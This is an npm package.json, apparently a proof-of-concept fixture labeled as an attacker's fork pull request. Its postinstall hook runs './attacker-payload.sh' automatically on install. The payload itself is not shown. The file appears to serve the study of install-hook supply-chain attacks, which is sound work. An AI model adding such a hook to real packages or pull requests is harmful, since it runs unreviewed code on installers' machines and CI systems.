{
  "name": "custard-poc-sample",
  "version": "1.0.0",
  "private": true,
  "description": "ATTACKER fork-PR version: adds a postinstall lifecycle script.",
  "scripts": {
    "postinstall": "bash ./attacker-payload.sh",
    "test": "echo \"[sample] benign test OK\""
  }
}
